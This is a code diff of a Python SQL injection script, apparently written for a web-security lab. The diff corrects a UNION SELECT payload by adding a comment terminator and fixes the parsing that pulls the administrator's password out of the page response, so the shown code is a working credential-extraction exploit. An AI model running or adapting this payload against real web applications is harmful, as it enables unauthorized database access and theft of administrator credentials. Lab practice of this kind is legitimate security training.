@@ -65,14 +65,14 @@ def get_column_name(url,userTable):
     res = perform_request(url,payload)
     soup = BeautifulSoup(res.text,"html.parser")
     username = soup.find(string=re.compile(".*username.*"))
-    password = soup.find(string=re.compile(".password."))
+    password = soup.find(string=re.compile(".*password.*"))
     return username, password
 
 def get_admin_password(url, username_col, password_col, table_name):
-    payload = "' UNION SELECT %s, %s FROM %s" %(username_col, password_col, table_name)
+    payload = "' UNION SELECT %s, %s FROM %s -- " %(username_col, password_col, table_name)
     res = perform_request(url, payload)
     soup = BeautifulSoup(res.text, "html.parser")
-    admin_password = soup.body.find(string="administraor").parent.findNext("td").contents[0]
+    admin_password = soup.body.find(string="administrator").parent.find_next("td").contents[0]
     return admin_password
 
 if __name__ == "__main__":
@@ -85,7 +85,6 @@ if __name__ == "__main__":
     
     # number of columns
     num_Columns = get_num_column(url)
-    print(num_Columns)
 
     # check first string containing columns
     string_column = get_string_column(url, num_Columns)
